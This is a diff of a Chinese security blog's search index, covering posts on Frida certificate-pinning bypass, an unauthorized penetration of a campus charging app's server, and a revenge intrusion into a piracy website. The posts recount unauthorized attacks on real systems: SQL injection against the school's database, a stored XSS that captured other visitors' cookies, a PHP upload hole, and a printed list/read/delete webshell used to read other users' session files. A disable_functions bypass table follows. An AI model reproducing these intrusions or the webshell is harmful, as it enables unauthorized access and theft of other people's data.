+<h3 id="开始抓包！"><a href="#开始抓包！" class="headerlink" title="开始抓包！"></a>开始抓包！</h3><p>终于在经过无数失败之后，可以开始抓包了。</p>
+<p>如果以上步骤都配置正确的话，此时打开APP，在PC上输入命令<code>frida -U com.tplink.ipc -l hook.js</code>后，点击相应的按钮，在命令行里会出现一串这样的输出：</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410161021863.png" alt="image-20200410161021863"></p>
+<p>每一个输出都代表一个请求的证书校验被绕过了。</p>
+<p>打开Burpsuite，终于能看到熟悉的请求了：</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410161204206.png" alt="image-20200410161204206"></p>
+<p>接下来就可以尽情的发挥脑洞开始测试了！</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整个思路其实非常简单，主要是这个APP没有进行过加固，分析起来比较方便，so的函数名都很全，所以在分析这一步中并没有太大难度。总体思路总结如下：</p>
+<ol>
+<li>通过反编译等方式确定证书绑定的核心函数的位置</li>
+<li>使用Frida对该核心函数进行Hook</li>
+<li>如果遇到无法代理的情况，嫌麻烦可以用反向代理的方式抓包</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>Burpsuite</tag>
+        <tag>Frida</tag>
+        <tag>工具配置</tag>
+        <tag>Android</tag>
       </tags>
   </entry>
   <entry>
@@ -881,62 +881,6 @@
       </tags>
   </entry>
   <entry>
-    <title>校园生活APP渗透记录</title>
-    <url>/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>最近使用校园生活这个APP给电动车充电，发现这个APP界面简陋，而且必须在校园网里才能连上服务器登录（外网环境无法使用，必须要拨VPN连进校园网才行）。最坑爹的是，这个APP并不支持iOS，必须用安卓手机才能安装，而我目前主力鸡是iPhone，之前的安卓机没有电话卡又不能上网，每次充电都必须带两个手机，iPhone开热点给安卓机联网，安卓机还要拨号VPN，着实麻烦，于是就想着有没有啥方法可以用iOS去控制充电。</p>
-<span id="more"></span>
-
-<p>正好前段时间渗透测试的课上说到以前有同学黑进了学校的邮件系统，想到一般情况下内部系统可能都没啥安全防护措施，就打算试一试，看看能不能分析一波登录和请求，然后再尝试搞个客户端或者Web端的。</p>
-<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>首先想到的是用Burpsuite对这个APP的流量进行分析，看看能不能捡个漏，通过抓包的方法来找到URL或者API，如果是内嵌Web的就更方便了，如果不是的话搞下API也许也能搞得定。</p>
-<p>在模拟器里装好APP，设置代理到Burpsuite，开抓！</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107160012091.png" alt="image-20201107160012091"></p>
-<p>发现登录请求是一个长成这样子的东西，看起来很像Base64编码后的数据，可是用Base64解码并没有看到有用的东西：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107160505582.png" alt="image-20201107160505582"></p>
-<p>好吧，到这一步只能盲猜是加密了，将加密后的Hex数据Base64编码。</p>
-<h2 id="逆向APK"><a href="#逆向APK" class="headerlink" title="逆向APK"></a>逆向APK</h2><p>既然是APK的安装包，那么逆一下去看看加密算法也很合理吧。</p>
-<p>在分析之前先看看请求有啥特点，当点击比如”我的账单“的选项的时候，发出去的请求虽然是加密的，但是内容并没有变化，那就可能是对称加密，大概率是ECB模式，没有加盐，没有iv的变化，所以才能明文不变的时候密文也不变。</p>
-<p>为了图省事，直接用dex2jar把class文件转成jar，然后用jd_gui来查看。</p>
-<p>原本想着是不是会有加壳、混淆啥的，对反编译并不抱很大的希望，结果拖进去一看，完全没有任何处理，整个程序的结构非常清晰，简直可以作为安卓逆向的新手入门范例了！那正好，也省的去折腾frida之类的方法了。</p>
-<p>首先找到与程序包名对应的包，如这里的<code>com.xxx.xxxlife</code>，发现一堆的Activity，一般来说登录和密码找回这两个部分的界面内容是最简单的，这里找到了login的Activity：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162214893.png" alt="image-20201107162214893"></p>
-<p>找这个Activity的目的是看看有没有发送请求的部分，毕竟它在发送之前是要先加密之后再发出去的嘛。</p>
-<p>果不其然发现了这个<code>DataUtils.login</code>，这里就是发送登录请求的核心部分。果断单击函数名跟踪过去。</p>
-<p>这个函数里面就是简单的对输入参数进行了拼装，合成一个json字符串，然后调用<code>sendRequest</code>函数将参数发送出去。那么这个<code>sendRequest</code>函数里面一定暗藏玄机。</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162530278.png" alt="image-20201107162530278"></p>
-<p>果不其然，在构建POST请求的时候，对其中的参数部分进行了加密处理，调用了<code>DES.encryptDES</code>函数。继续跟踪：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107162704233.png" alt="image-20201107162704233"></p>
-<p>这里简直毫无悬念，密钥、iv全部暴露出来，使用DES CBC的加密方式，5Padding的填充。</p>
-<p>这样一来，通信的加解密就算全搞定了，再回去看看登录的部分，没有Cookie，没有Session，全靠数据里面的UserID……咦？？是不是说我去修改一下Shared_Perference里的数据就可以……花别人的钱了？？？</p>
-<h2 id="用Python验证一下"><a href="#用Python验证一下" class="headerlink" title="用Python验证一下"></a>用Python验证一下</h2><p>对于这个加解密，尝试用Python验证一下。这里我用的是Python3环境（毕竟2.x已经被放弃了呢），pyDes的库。这里因为数据都是JSON格式进行封装，然后再加密，再Base64，所以代码也尝试加了JSON的格式化等，来适应这个系统的数据传输。</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107163517509.png" alt="image-20201107163517509"></p>
-<p>加了控制选项，这样可以更方便的控制是否需要编码/解码。效果如下：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107163638469.png" alt="image-20201107163638469"></p>
-<p>成功解密~</p>
-<p>如果只是想看看数据，可以用Frida/Objection来Hook加解密函数，可能会更方便，配合脚本什么的还能直接调用sendRequest函数，应该会更爽，不过这里懒得折腾就没进一步去搞了。</p>
-<h2 id="手贱的”更进一步“"><a href="#手贱的”更进一步“" class="headerlink" title="手贱的”更进一步“"></a>手贱的”更进一步“</h2><p>到这里本来不想搞了，结果忽然想到”要不要试一下SQL注入呢“。</p>
-<p>上面那个解出来的请求是请求用户信息（accountinfo），下面的userid是当前用户的id，一串纯数字。第一个想到就是有没有数字型的注入，于是输入了<code>or 1=1</code>，结果，返回了一个巨大的Response：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164222145.png" alt="image-20201107164222145"></p>
-<p>好吧，我觉得我好像成功了？</p>
-<p>每次用脚本加密、再解密数据实在不方便，于是就在上面的Python代码的基础上加了个<code>Requests</code>库，将用户输入的内容自动加密POST发出去，再解密接收到的数据……</p>
-<p>先通过<code>order by 1</code>这样的语句确定当前返回值一共有几列，然后就常规的<code>union select</code>带出数据：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164520544.png" alt="image-20201107164520544"></p>
-<p>从结果中可以看出是一个SQLSERVER 2008的数据库：</p>
-<p><img src="/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/image-20201107164604246.png" alt="image-20201107164604246"></p>
-<p>发现SQLServer的数据库平时遇到的太少了，基本都是MySQL的多，而且想想作为探索来说这么多已经远远超过开始想做的事情了，就不再继续搞下去了吧。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过简单的对这个APP进行了一波分析，发现了一些问题：</p>
-<p>1、密钥信息硬编码</p>
-<p>2、服务端没有有效的身份校验（缺少Cookie等身份验证机制）</p>
-<p>3、存在水平越权（修改userid可以查看其他人的信息）</p>
-<p>4、服务端存在SQL注入</p>
-<p>5、可能存在反序列化的问题（毕竟是JSON数据，这个部分没有验证）</p>
-<p>最后，虽然是校园内部使用的APP，安全性也非常重要，如果被不坏好意的人利用了，不仅仅是我们这些学生的信息遭受损失，系统里的充值信息甚至金钱可能都会遭受损失。</p>
-]]></content>
-      <tags>
-        <tag>Android</tag>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>绕过群晖限制修改HTTP头</title>
     <url>/2021/02/20/%E7%BB%95%E8%BF%87%E7%BE%A4%E6%99%96%E9%99%90%E5%88%B6%E4%BF%AE%E6%94%B9HTTP%E5%A4%B4/</url>
     <content><![CDATA[<p>这个故事要从我折腾群晖的免密分享视频开始说起……</p>
@@ -1011,152 +955,59 @@
       </tags>
   </entry>
   <entry>
-    <title>被伪装成“知识付费”的盗版网站坑了钱之后……</title>
-    <url>/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/</url>
-    <content><![CDATA[<p>最近迷上了评书，听了一个片段之后很想找到全集把故事听完，于是在网上搜索。找到了一个貌似资源很全的网站，但是“知识付费”时代，必须充会员才能获取真实的下载地址。由于找了很久都没找到这段评书的资源，于是也没多想，充了12元买了这个资源。</p>
+    <title>校园生活APP渗透记录</title>
+    <url>/2020/11/07/%E6%A0%A1%E5%9B%AD%E7%94%9F%E6%B4%BBAPP%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>最近使用校园生活这个APP给电动车充电，发现这个APP界面简陋，而且必须在校园网里才能连上服务器登录（外网环境无法使用，必须要拨VPN连进校园网才行）。最坑爹的是，这个APP并不支持iOS，必须用安卓手机才能安装，而我目前主力鸡是iPhone，之前的安卓机没有电话卡又不能上网，每次充电都必须带两个手机，iPhone开热点给安卓机联网，安卓机还要拨号VPN，着实麻烦，于是就想着有没有啥方法可以用iOS去控制充电。</p>
 <span id="more"></span>
 
-<p>但是充完之后发现想要的资源下载链接是一个百度云，资源已经失效了，于是想找找反馈的入口。结果仔细一看才发现，这个网站非常不正规，虽然是通过QQ登录，但是一般网站会有独立的账号体系，而这个网站不能修改用户的信息，看起来就像是没完工的测试项目似的。</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806160535564.png" alt="image-20200806160535564"></p>
-<p>而且网站中的资源非常博杂，从相声戏曲，到新媒体运营，再到编程、软件，简直应有尽有，而且全是百度云的资源，看起来像是收集的盗版的东西。大部分的资源页面包括首页推荐的热门资源中都没有任何留言，就像一幢豪华CBD大厦里面空无一人，显得异常诡异。</p>
-<p>查看页面的过程中，只看到了一个站长的联系QQ，加过之后也没反应。那既然这样，还是靠自己一探究竟吧。</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>俗话说知己知彼，百战不殆。在正式开始之前先收集一下目标站点的信息。不同于正规的渗透测试，目标就是这个网站，因此就从服务器IP、开放端口、域名、接口这些信息下手。</p>
-<h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>首先通过域名，反查它的IP地址以及子域名信息。这里子域名查询没有啥结果，也和预想的差不多，一个坑钱的小网站应该也不会有什么其他子域。</p>
-<p>这里用了Chrome的插件 hacker target 来进行简单查询：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806163057871.png" alt="image-20200806163057871"></p>
-<h3 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h3><p>拿到了IP地址，利用shodan初步看看开放了什么端口：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806162913629.png" alt="image-20200806162913629"></p>
-<p>好家伙，有22还有3306？不过shodan向来都不太准，再用其他的工具确认一下。</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806163328543.png" alt="image-20200806163328543"></p>
-<p>这回发现多了个21，却没有3306了。那最后再用本机的nmap确认一下端口。</p>
-<p>因为直接跑nmap 65535个端口时间太长，而且很容易被云厂商认为是扫描行为而封禁IP，所以可以用这种外围打探的方式先确定基本的端口，最后再用nmap指定端口来确定是否真的开放了。</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806164804389.png" alt="image-20200806164804389"></p>
-<p>那么目前能确定的开放端口就是这些。</p>
-<h3 id="组件信息"><a href="#组件信息" class="headerlink" title="组件信息"></a>组件信息</h3><p>对于开放的端口，简单识别一下，其中<code>21 - FTP</code>, <code>22 - SSH</code>, <code>80,443 - HTTP(S)</code>, <code>3306 - MySQL</code>，那剩下的8888是什么？访问一下界面，从内容看应该是宝塔面板的登录接口，但是做了相应的安全设置。</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806200632061.png" alt="image-20200806200632061"></p>
-<p>回到HTTP(S)服务上来，先尝试用在线CMS识别，发现无法识别出使用的CMS，只知道用的是PHP：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201506225.png" alt="image-20200806201506225"></p>
-<p>再看robots.txt文件，也没什么发现：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201628384.png" alt="image-20200806201628384"></p>
-<p>那么目前判断很有可能就是自己开发的系统。而2020年用PHP开发系统，至少是基于某个框架的，因此寻找一下有没有使用框架的蛛丝马迹。很快，在未登录状态下点击发帖按钮有个登录跳转（这部分在下文详细说如何发现的）：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806201941920.png" alt="image-20200806201941920"></p>
-<p>咦？这熟悉的 :( 很想是thinkphp呀！</p>
-<p>至此，简单的目标信息收集就结束了，总结如下：</p>
-<p>目标域名：<a href="http://www.xxx.net/">www.xxx.net</a></p>
-<p>子域名：无</p>
-<p>目标IP：3x.xx.xx.x1</p>
-<p>开放端口：21，22，80，443，3306，8888</p>
-<p>CMS信息：暂无</p>
-<p>使用语言：PHP</p>
-<p>使用框架：ThinkPHP（目前版本未知）</p>
-<p>部署环境：宝塔Linux面板</p>
-<h2 id="威胁建模-漏洞分析"><a href="#威胁建模-漏洞分析" class="headerlink" title="威胁建模/漏洞分析"></a>威胁建模/漏洞分析</h2><p>由于是纯黑盒测试，因此不可能有完整的威胁建模进行漏洞分析，只能根据前期收集的信息结合挖洞的过程来慢慢进行威胁建模的部分，因此这两块是合在一起进行的。</p>
-<p>首先根据信息收集的内容，可以知道21和22两个端口大概率是宝塔面板提供的，为了方便用户对网站进行管理。因此这里就不去尝试暴力破解了（印象中宝塔是不允许设置弱密码的），如果Web应用的部分无法突破再考虑端口的暴力破解。同理3306也是这样。</p>
-<p>8888端口是宝塔的控制面板，因为安全策略无法直接使用。因此将注意力放在443端口的Web Appication上。</p>
-<h3 id="HTML-JS分析"><a href="#HTML-JS分析" class="headerlink" title="HTML/JS分析"></a>HTML/JS分析</h3><p>很多情况下，在HTML源码和JS脚本中可能会隐藏诸多秘密，尤其是在目前前端开发喜欢用VUE.js，网站的页面路径很多都会在JS里暴露。</p>
-<p>首先先看首页的HTML源码以及加载的非第三方JS代码。在首页的HTML源码中，发现了一段被注释掉的导航栏代码：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806205311823.png" alt="image-20200806205311823"></p>
-<p>试一下<code>/taolun</code>，看看还有没有这个页面：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806205618250.png" alt="image-20200806205618250"></p>
-<p>看到这个讨论区，很多都是在吐槽链接失效、资源付费后没用的帖子，难怪要把这个导航栏给注释掉！</p>
-<p>在页面右下角有一个发新帖的按钮，由于是未登录状态，因此点击之后弹出跳转登录的错误页面（即信息收集里看到的 :( 的页面），确定目标使用的框架是Thinkphp。</p>
-<p>看了其他页面的HTML和JS，没有其他有价值的内容了。</p>
-<h3 id="ThinkPHP已知漏洞"><a href="#ThinkPHP已知漏洞" class="headerlink" title="ThinkPHP已知漏洞"></a>ThinkPHP已知漏洞</h3><p>既然确定了框架是TP，那么可以试试已知漏洞，万一有呢~</p>
-<p>可以利用<a href="https://github.com/theLSA/tp5-getshell/%E5%B7%A5%E5%85%B7%E6%9D%A5%E6%96%B9%E4%BE%BF%E7%9A%84%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%E3%80%82">https://github.com/theLSA/tp5-getshell/工具来方便的进行检测。</a></p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806211806612.png" alt="image-20200806211806612"></p>
-<p>这里显示三个PoC均为404，可能是路由配置与默认有差距。这里可以执行其他的用例，比如_method变量覆盖漏洞（可参考<a href="https://www.cnblogs.com/WindrunnerMax/p/12558256.html">《ThinkPHP5.0 漏洞测试》</a>）：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806212306138.png" alt="image-20200806212306138"></p>
-<p>这里成功让系统报错，再次确认确实是TP的框架，版本V5.0.0，以及绝对路径等等，这里就不再详细展示。</p>
-<p>测试了其他的已知漏洞，都未能成功触发，此路不通。</p>
-<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>因为用的是TP的框架，因此这里实际上也算是已知漏洞的验证了。因为TP自带防护，而且测试了几个点发现SQL防护应该是打开的，而某些注入是需要特定条件（比如把input变量直接转成数组），因为没有源码，试了几个点都没成功就放弃了&gt;.&lt; …</p>
-<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS在这里其实没太大作用，整个网站都没找到有与后台的联系，比如问题反馈什么的，不确定管理员是否会去查看，不过抱着试一试的心情，开始找输入点。</p>
-<p>依然还是在<code>/taolun</code>的页面下，找了个帖子进去，发现可以回帖。本着先试试水的心态，复制了这个帖子的标题进去，发现竟然编辑器支持样式！</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806213651303.png" alt="image-20200806213651303"></p>
-<p>那这就说明，很有可能这个接口根本不会对输入进行过滤！</p>
-<p>迅速打开XSS平台，将代码复制下来，用Burpsuite拦住消息，在结尾插入代码，搞定！</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806214055993.png" alt="image-20200806214055993"></p>
-<p>先试试我自己：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806214330841.png" alt="image-20200806214330841"></p>
-<p>成功读到了我的Cookie。</p>
-<p>但是因为并没有注意邮件，实际上很快就有人看了这个帖子触发了XSS，但等我看到的时候已经失效了……</p>
-<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>因为XSS的成功，我判断目标站点应该是除了框架默认的安全配置之外并没有进行额外的安全加固。在“发新帖”的部分，允许用户在帖子里上传图片：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806215141784.png" alt="image-20200806215141784"></p>
-<p>这就给了我机会了。先试试简单的，编辑一个文本文件，内容是</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br></pre></td></tr></table></figure>
-
-<p>文件名保存成<code>1.jpg</code>。上传的时候用Burp将filename的后缀改成.php：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222704821.png" alt="image-20200806222704821"></p>
-<p>浏览器访问成功：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222905548.png" alt="image-20200806222905548"></p>
-<p>利用这个页面，正好查看一下disable_functions的情况：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806222955099.png" alt="image-20200806222955099"></p>
-<p>这里可以看到，应该是宝塔面板的设置，在配置里将所有可能命令执行的函数全部都禁用了，因此上传Webshell也没什么意义，没法用菜刀或者AntSword进行连接。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>上面的步骤试探到文件上传，就已经找到了相应的方法可以进行利用了。本来的想法是通过文件上传进行反弹Shell，进一步提权进行后渗透的步骤，但是这里因为<code>disable_functions</code>卡住，需要绕过。</p>
-<p>在实施绕过这个步骤之前，可以考虑先利用一下3306端口。之前发现3306是开放的，目前又可以上传PHP源码，可以写一个读取文件的PHP代码，将TP的database.php读出来，获取到数据库用户名和密码从而进行连接。</p>
-<p>同时，为了保证之前的phpinfo页面不被其他人发现，写了一个删除文件功能（如果后面不用了还能把上传的这些PHP都删了）：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;dir&quot;</span>];</span><br><span class="line"><span class="variable">$del</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;del&quot;</span>];</span><br><span class="line"><span class="variable">$read</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;read&quot;</span>];</span><br><span class="line"><span class="variable">$fname</span> = @<span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$del</span> <span class="keyword">and</span> <span class="variable">$fname</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span>(unlink(<span class="variable">$dir</span>.<span class="variable">$fname</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$read</span> <span class="keyword">and</span> <span class="variable">$fname</span>)&#123;</span><br><span class="line">	<span class="variable">$handler</span>=fopen(<span class="variable">$dir</span>.<span class="variable">$fname</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> fread(<span class="variable">$handler</span>, filesize(<span class="variable">$dir</span>.<span class="variable">$fname</span>));</span><br><span class="line">	fclose(<span class="variable">$handler</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dir</span>)&#123;</span><br><span class="line">	<span class="variable">$handler</span>=opendir(<span class="variable">$dir</span>);</span><br><span class="line">	<span class="keyword">while</span>((<span class="variable">$filename</span> = readdir(<span class="variable">$handler</span>)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	closedir(<span class="variable">$handler</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$fn</span>)&#123;</span><br><span class="line">		<span class="variable">$mark</span>=<span class="string">&quot; &quot;</span>;<span class="keyword">if</span>(is_dir(<span class="variable">$dir</span>.<span class="variable">$fn</span>)) <span class="variable">$mark</span>=<span class="string">&quot;+&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$mark</span> . <span class="variable">$fn</span> . <span class="string">&quot; &quot;</span> . @filesize(<span class="variable">$dir</span>.<span class="variable">$fn</span>) .<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>其实功能很简单，就是列出目录、读取文件、删除文件。</p>
-<h3 id="查看Session文件"><a href="#查看Session文件" class="headerlink" title="查看Session文件"></a>查看Session文件</h3><p>忽然想到，之前XSS累死累活，不就是想搞一个SessionID嘛，这都进来了不就可以直接看了？一般情况下，Session文件是存放在<code>/tmp</code>目录下的，PHP默认是以<code>sess_</code>开头的文件名。</p>
-<p>先用之前上传的脚本试一下：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806224057289.png" alt="image-20200806224057289"></p>
-<p>Bingo！确实在这里。Response中文件名后面的数字是文件大小，超时的Session文件中的数据会被删除，因此大小是 0 。</p>
-<p>那找一个大小不为0的，看看内容：</p>
-<p><img src="/2020/08/05/%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E5%9D%91%E4%BA%86%E9%92%B1%E4%B9%8B%E5%90%8E/image-20200806224332843.png" alt="image-20200806224332843"></p>
-<h3 id="查看数据库配置"><a href="#查看数据库配置" class="headerlink" title="查看数据库配置"></a>查看数据库配置</h3><p>同理，通过前面phpinfo中的绝对路径，可以构建../来进入<code>application</code>文件夹，读取<code>database.php</code>文件，获取MySQL用户名密码。</p>
-<p>考虑到宝塔启动MySQL用的是低权限账户，且数据库中的数据目前并没有什么用，还可能又风险，想了想还是不去弄了，反正是个思路。</p>
-<h3 id="突破disable-functions"><a href="#突破disable-functions" class="headerlink" title="突破disable_functions"></a>突破disable_functions</h3><p>没有命令执行的WebShell是没有太大的利用价值的，这里想突破一下disable_functions。</p>
-<p>突破的方法有很多，大致总结如下：</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>PHP版本</th>
-<th>条件</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>寻找未禁用函数</td>
-<td>任意</td>
-<td>disable_functions中没有禁用某些函数</td>
-</tr>
-<tr>
-<td>LD_PRELOAD劫持</td>
-<td>任意</td>
-<td>Linux环境，putenv()、mail()函数可用</td>
-</tr>
-<tr>
-<td>ShellShock绕过</td>
-<td>5.*</td>
-<td>目标OS有CVE-2014-6271，Linux环境，putenv()、mail()函数可用</td>
-</tr>
-<tr>
-<td>imap_open任意命令执行</td>
-<td>任意</td>
-<td>开启imap扩展，并支持imap_open()函数</td>
-</tr>
-<tr>
-<td>Apache+mod_cgi+.htaccess绕过</td>
-<td>任意</td>
-<td>Apache，启用mod-cgi，允许.htaccess且文件可写</td>
-</tr>
-<tr>
-<td>ImageMagick漏洞绕过</td>
-<td>&gt;=5.4</td>
-<td>开启ImageMagick插件且插件版本&lt;= 3.3.0</td>
-</tr>
-<tr>
-<td>FFI外部函数接口绕过</td>
-<td>7.4</td>
-<td>ffi.enable=true</td>
-</tr>
-</tbody></table>
-<p>从目标环境来看，disable_functions已经禁用全部可能利用的函数，导致不满足全部的利用条件。</p>
